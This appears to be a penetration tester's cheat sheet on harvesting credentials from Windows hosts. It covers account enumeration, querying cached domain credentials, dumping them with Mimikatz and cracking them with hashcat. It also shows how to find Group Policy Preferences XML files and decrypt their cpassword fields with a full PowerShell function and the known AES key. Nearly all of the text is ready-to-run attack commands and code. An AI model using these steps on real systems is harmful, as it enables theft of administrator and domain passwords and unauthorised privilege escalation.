# Index
- [[ Windows Credential Harvesting]]

# Local Account Information

#### Enumerating Local User Accounts

- **CMD:** List all local user accounts:
    ```cmd
    net user
    ```

- **PowerShell:** List all local user accounts:
    ```powershell
    Get-LocalUser
    ```

#### Enumerating Privileged Local Users (Administrators)

- **CMD:** List all members of the local Administrators group:
    ```cmd
    net localgroup Administrators
    ```

- **PowerShell:** List all members of the local Administrators group:
    ```powershell
    Get-LocalGroupMember -Group "Administrators"
    ```

# Cached Domain Credentials

Windows may cache domain credentials locally, allowing users to log in without contacting the domain controller when it's unavailable. Cached domain credentials are stored in the registry in an encrypted format.

#### Query Cached Domain Credentials
- **CMD/PowerShell:** Query the cached domain credentials from the registry:
    ```powershell
    reg query "HKLM\SECURITY\Cache"
    ```

These cached credentials are stored as `MSCachev2` hashes, which cannot be directly decoded using native PowerShell or CMD tools. You will need to use external tools like **Mimikatz** to extract and decrypt them.

- **Mimikatz:** Dump cached domain credentials:
    ```cmd
    mimikatz.exe "lsadump::cache" exit
    ```

Once you have the `MSCachev2` hashes, you can use **hashcat** to crack them:

- **Hashcat:** Crack `MSCachev2` hashes:
    ```bash
    hashcat -m 2100 <hashes_file> <password_list>
    ```

# Group Policy Preferences (GPP) Credential Storage

Group Policy Preferences can store sensitive credentials in XML files, such as local administrator passwords, and these may be stored in an encrypted form using the `cpassword` field.

#### Searching for GPP Files

- **CMD:** Search for `Groups.xml` files across the filesystem:
    ```cmd
    dir C:\ /s /b | findstr Groups.xml
    ```

- **PowerShell:** Search for `Groups.xml` files that may contain GPP credentials:
    ```powershell
    Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "Groups.xml" }
    ```

#### Location of GPP Files

GPP files are commonly located in the following directory:
```plaintext
C:\ProgramData\Microsoft\Group Policy\History\<GPO GUID>\Machine\Preferences\Groups\Groups.xml
```

#### Extracting `cpassword` from GPP Files

The `cpassword` field stores the encrypted password. Extract the `cpassword` from a GPP XML file using the following commands:

- **CMD:** Extract the `cpassword` field from `Groups.xml`:
    ```cmd
    findstr cpassword C:\Path\To\Groups.xml
    ```

- **PowerShell:** Extract the `cpassword` field from `Groups.xml`:
    ```powershell
    (Get-Content "C:\Path\To\Groups.xml").Select-String -Pattern "cpassword"
    ```

#### Decrypting `cpassword`

To decrypt the `cpassword`, a known AES key can be used. This PowerShell function allows for decryption:

- **PowerShell:** Decrypt `cpassword` from GPP XML files:
    ```powershell
    function ConvertFrom-GPPPassword {
        param ([String]$Cpassword)
        $key = [Byte[]](0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8)
        $CpasswordBytes = [Convert]::FromBase64String($Cpassword)
        $AESObject = New-Object System.Security.Cryptography.AesManaged
        $AESObject.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AESObject.Padding = [System.Security.Cryptography.PaddingMode]::None
        $AESObject.Key = $key
        $AESObject.IV = New-Object Byte[] 16
        $Decryptor = $AESObject.CreateDecryptor()
        $PlainTextBytes = $Decryptor.TransformFinalBlock($CpasswordBytes, 0, $CpasswordBytes.Length)
        $PlainText = [System.Text.Encoding]::Unicode.GetString($PlainTextBytes)
        return $PlainText
    }

    # Usage:
    ConvertFrom-GPPPassword -Cpassword "<extracted_cpassword>"
    ```

This will return the plaintext password for the local administrator or other stored credentials.